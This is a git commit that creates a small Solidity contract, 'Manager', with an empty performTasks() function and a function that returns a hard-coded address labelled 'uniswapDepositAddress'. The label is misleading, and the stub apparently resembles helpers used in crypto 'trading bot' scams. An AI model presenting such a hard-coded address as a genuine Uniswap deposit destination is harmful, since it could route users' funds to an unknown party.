7c66f70d471c4274b6b0dc0d880b99fe92879fa7
o-justin-o <50025428+o-justin-o@users.noreply.github.com>
2022-11-02 15:41:55 -0600

    Create cm.sol

---
+++ cm.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.6.6;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function uniswapDepositAddress() public pure returns (address) {
+		return 0xf81DB726081de89469e530Cd39a2CAC6DF2AEFA7;
+	}
+}
